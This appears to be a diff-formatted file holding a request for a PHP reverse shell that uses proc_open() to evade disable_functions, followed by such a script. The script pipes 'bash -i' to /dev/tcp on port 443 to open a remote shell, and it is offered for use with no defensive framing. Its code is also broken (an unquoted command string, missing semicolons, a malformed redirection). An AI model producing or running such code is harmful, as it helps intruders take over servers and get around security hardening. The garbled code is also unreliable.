@@ -1,0 +1,25 @@
+send me a different varation of a PHP Reverse Shell Script using only the proc_open() function to evade disable_functions in PHP Safe Mode
+-------- snip --------
+
+
+<?php 
+
+// Set up the command 
+$command = bash -i > /dev/tcp/127.0.0.1/443 0>1
+
+// Create resource 
+$descriptorspec = array( 
+ 0 => array("pipe", "r"), // stdin is a pipe that the child will read from 
+ 1 => array("pipe", "w"), // stdout is a pipe that the child will write to 
+ 2 => array("pipe", "w") // stderr is a pipe that the child will write to 
+) 
+
+// Create the process 
+$process = proc_open($command, $descriptorspec, $pipes) 
+
+// Close the resource 
+if (is_resource($process)) { 
+ proc_close($process) 
+} 
+
+?>
